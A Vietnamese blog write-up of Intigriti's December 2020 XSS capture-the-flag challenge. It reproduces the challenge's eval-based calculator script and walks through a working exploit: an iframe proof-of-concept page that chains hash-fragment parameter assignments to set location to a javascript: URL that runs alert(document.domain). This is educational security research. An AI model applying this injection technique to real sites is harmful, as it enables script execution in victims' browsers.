## Giới thiệu

Gần đây mình có làm thử một bài CTF về XSS của Intigriti (platform bug bounty của châu Âu) và nhờ có sự trợ giúp của những người bạn cực kỳ bá đạo, cuối cùng mình cũng hoàn thành được challenge. Challenge đã kết thúc hôm 14/12 và sau đây là quick write-up.

## Đề bài

[https://challenge-1220.intigriti.io/](https://challenge-1220.intigriti.io/)

![](https://images.viblo.asia/dc6cfb0a-5c64-4f68-96cf-33afabf5b228.png)

gồm các thông tin và một cái calculator bằng JS để giúp các hacker tính bounty cho nó nhanh :smiley: 

Đề bài yêu cầu như sau:
- Payload XSS phải hoạt động trên version mới nhất của Firefox và Chrome
- Phải chạy được payload `alert(document.domain)`
- Payload phải chạy trên domain `challenge-1220.intigriti.io`
- Không phải là self-XSS hay là tấn công MiTM
- Lời giải sbubmit vào [go.intigriti.com/submit-solution](go.intigriti.com/submit-solution)

Trong quá trình đăng tweet, ban tổ chức có đưa ra gợi ý mỗi khi dòng tweet được thêm 100 likes, và đây là 4 hint được đưa ra:

- hint 1: less eval, more parsing
- hint 2: The solution needs 3D
- hint 3: hashoo
- hint 4: Nobody likes duplicates, except parameters

Đến đây bạn nào muốn tự làm thử thì có thể dừng lại 1 chút, không thì đọc tiếp nhé.

### Source code

Source code của đề bài nằm ở file [https://challenge-1220.intigriti.io/script.js](https://challenge-1220.intigriti.io/script.js) như sau:

```js
window.name = "Intigriti's XSS challenge";

const operators = ["+", "-", "/", "*", "="];
function calc(num1 = "", num2 = "", operator = ""){
  operator = decodeURIComponent(operator);
  var operation = `${num1}${operator}${num2}`;
  document.getElementById("operation").value = operation;
  if(operators.indexOf(operator) == -1){
    throw "Invalid operator.";
  }
  if(!(/^[0-9a-zA-Z-]+$/.test(num1)) || !(/^[0-9a-zA-Z]+$/.test(num2))){
    throw "No special characters."
  }
  if(operation.length > 20){
    throw "Operation too long.";
  }
  return eval(operation);
}

function init(){
  try{
    document.getElementById("result").value = calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator"));
  }
  catch(ex){
    console.log(ex);
  }
}

function getQueryVariable(variable) {
    window.searchQueryString = window.location.href.substr(window.location.href.indexOf("?") + 1, window.location.href.length);
    var vars = searchQueryString.split('&');
    var value;
    for (var i = 0; i < vars.length; i++) {
        var pair = vars[i].split('=');
        if (decodeURIComponent(pair[0]) == variable) {
            value = decodeURIComponent(pair[1]);
        }
    }
    return value;
}

/*
 The code below is calculator UI and not part of the challenge
*/

window.onload = function(){
 init();
 var numberBtns = document.body.getElementsByClassName("number");
 for(var i = 0; i < numberBtns.length; i++){
   numberBtns[i].onclick = function(e){
     setNumber(e.target.innerText)
   };
 };
 var operatorBtns = document.body.getElementsByClassName("operator");
 for(var i = 0; i < operatorBtns.length; i++){
   operatorBtns[i].onclick = function(e){
     setOperator(e.target.innerText)
   };
 };

  var clearBtn = document.body.getElementsByClassName("clear")[0];
  clearBtn.onclick = function(){
    clear();
  }
}

function setNumber(number){
  var url = new URL(window.location);
  var num1 = getQueryVariable('num1') || 0;
  var num2 = getQueryVariable('num2') || 0;
  var operator = getQueryVariable('operator');
  if(operator == undefined || operator == ""){
    url.searchParams.set('num1', parseInt(num1 + number));
  }
  else if(operator != undefined){
    url.searchParams.set('num2', parseInt(num2 + number));
  }
  window.history.pushState({}, '', url);
  init();
}

function setOperator(operator){
  var url = new URL(window.location);
  if(getQueryVariable('num2') != undefined){ //operation with previous result
    url.searchParams.set('num1', calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator")));
    url.searchParams.delete('num2');
    url.searchParams.set('operator', operator);
  }
  else if(getQueryVariable('num1') != undefined){
    url.searchParams.set('operator', operator);
  }
  else{
    alert("You need to pick a number first.");
  }
  window.history.pushState({}, '', url);
  init();
}

function clear(){
    var url = new URL(window.location);
    url.searchParams.delete('num1');
    url.searchParams.delete('num2');
    url.searchParams.delete('operator');
    window.history.pushState({}, '', url);
    document.getElementById("result").value = "";
    init();
}
```

Đề bài gồm 2 phần và phần dưới dùng để tạo ra calculator thì được note là `The code below is calculator UI and not part of the challenge` (cơ mà việc này cũng không ngăn cản được các hacker exploit vào đây và tạo ra  kha khá các lời giải un-intented :v)

### Phân tích

- Sau khi load trang thì flow sẽ là `window.onload` -> `init` -> `calc`
- Hàm `getQueryVariable` có nhiệm vụ lấy ra giá trị tương ứng với tham số query string được truyền vào. VD: `&num1=1` thì `getQueryVariable("num1")` sẽ trả về `1`. Hàm này tìm chuỗi query string bằng cách tìm ký tự `?` và sau đó split bằng `&` rồi split tiếp bằng `=`, nếu có nhiều cặp thì chỉ lấy cái cuối cùng (chắc liên quan đến hint 4, param pollution?)
- Hàm `calc` sẽ tạo ra chuỗi biểu thức từ ``${num1}${operator}${num2}`` và thực hiện `eval`. Có một vài giới hạn:
    - operator nằm trong mảng `["+", "-", "/", "*", "="]`
    - `num1` và `num2` sẽ không được chứa các ký tự đặc biệt, chỉ có alphanumeric (riêng `num1` thì cho phép thêm `-`)
    - chiều dài của biểu thức không quá 20 ký tự.
- Với hint 2 ta có thể nghĩ đến việc gán (`3D` là encode của `=`), VD: `&num1=location&operator=%3D&num2=javascript:alert(origin)` chẳng hạn thì `location = javascript:alert(origin)` sẽ trigger XSS.
    - Tuy nhiên, không được dùng ký tự đặc biệt -> chuyển hướng sang gán vào 1 biến nào đấy ta control được (và là global): ở đây là `searchQueryString`. 
    - Tuy nhiên lần 2, `location=searchQueryString` thì lại dài quá 20 ký tự. Vậy sẽ cần gán biến trung gian?
- Vì hàm `getQueryVariable` không để ý đến vị trí của `?` nên ta có thể nhét hết payload vào hash fragment của URL. (hint 3)
- đưa trang vào iframe như sau nhằm eval ra `location=name` cũng sẽ fail vì `name` đã được gán lại giá trị ở đầu file JS:

```html
<iframe
  name="javascript:alert(origin)"
  src="https://challenge-1220.intigriti.io/?num1=location&operator=%3D&num2=name"
>
```

## Lời giải

### PoC

[https://challenge-1220-poc.surge.sh/](https://challenge-1220-poc.surge.sh/)

### Source code

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Challenge 1220 Solution</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  </head>

  <body>
    <!-- First step -->
    <iframe
      id="inner"
      onload="run()"
      src="https://challenge-1220.intigriti.io/#?javascript:alert(document.domain)//&num1=onhashchange&operator=%3D&num2=onload"
    >
    </iframe>

    <script>
      function run() {
        inner.src =
          "https://challenge-1220.intigriti.io/#?javascript:alert(document.domain)//&num1=z&operator=%3d&num2=searchQueryString"; // Second step

        setTimeout(function () {
          inner.src =
            "https://challenge-1220.intigriti.io/#?javascript:alert(document.domain)//&num1=location&operator=%3d&num2=z"; // Final step
        }, 1000);
      }
    </script>
  </body>
</html>
```
Để exploit chúng ta cần thực hiện 3 step:

0. Load trang challenge vào 1 iframe. Đưa hết payload vào hash fragment.
1. Dựa vào trick là khi hash fragment thay đổi thì trang không bị reload lại (parent có thể thay đổi hash của child iframe) (một dạng XS-Leaks xem ở  [đây](https://portswigger.net/research/xs-leak-leaking-ids-using-focus)) nhưng event `onhashchange` vẫn được trigger, ta gán `onhashchange=onload` với payload sau:

```
#?javascript:alert(document.domain)//&num1=onhashchange&operator=%3D&num2=onload
```

Sau bước này, ta hay đổi hash của src của iframe từ parent để trigger event, đồng thời trigger tiếp `onload` bên trong iframe, thực hiện việc gán biến trung gian.

2. Gán `z=searchQueryString` bằng payload dưới đây để bypass việc limit 20 ký tự:

```
#?javascript:alert(document.domain)//&num1=z&operator=%3d&num2=searchQueryString
```

3.  Gán `location=z` bằng payload sau:

```
#?javascript:alert(document.domain)//&num1=location&operator=%3d&num2=z
```

Vì `z` lúc này đã là `searchQueryString` và có giá trị là

```
javascript:alert(document.domain)//&num1=location&operator=%3d&num2=z
```

phần `//` được thêm vào để comment hết chuỗi đằng sau, đảm bảm đoạn này là JS hợp lệ cho `eval`:

![](https://images.viblo.asia/d8d8f077-006a-45b8-84bb-8f7639ac91c0.png)

sẽ trigger XSS -> Challenge solved!

4. Các hàm `run` và `setTimeout` được sử dụng để đảm bảo đúng thứ tự thực hiện của các payload.

## Kết quả

![](https://images.viblo.asia/53f42403-2d45-4cea-b2a1-0529680b9d5e.png)

Kết quả của challenge: [https://twitter.com/intigriti/status/1338457245726760962](https://twitter.com/intigriti/status/1338457245726760962)

![](https://images.viblo.asia/26616280-f166-47cf-bbbb-f8705a0bcbfd.png)

## Extra

Recommend mọi người đọc thêm các write-up khác, đặc biệt là bộ 3 solution (kèm cả unintented) của thánh @terjanq (thánh ăn gì để em cúng ạ :bowing_man: )

- [https://hackmd.io/@terjanq/challenge-1220](https://hackmd.io/@terjanq/challenge-1220)
- [https://holme-sec.medium.com/3-and-a-half-solutions-for-intigritis-challenge-1220-ec57335697f6](https://holme-sec.medium.com/3-and-a-half-solutions-for-intigritis-challenge-1220-ec57335697f6)
- [https://www.youtube.com/watch?v=4hb4Rd6ZDNs](https://www.youtube.com/watch?v=4hb4Rd6ZDNs)
- [https://acut3.github.io/ctf/2020/12/13/intigriti-december-xss-challenge.html](https://acut3.github.io/ctf/2020/12/13/intigriti-december-xss-challenge.html)
- [https://medium.com/bugbountywriteup/intigritis-december-xss-challenge-2020-unintended-solution-8205b4a4b95b](https://medium.com/bugbountywriteup/intigritis-december-xss-challenge-2020-unintended-solution-8205b4a4b95b)

## Kết

> Shout out to my friends, you guys have never failed to amaze me :handshake: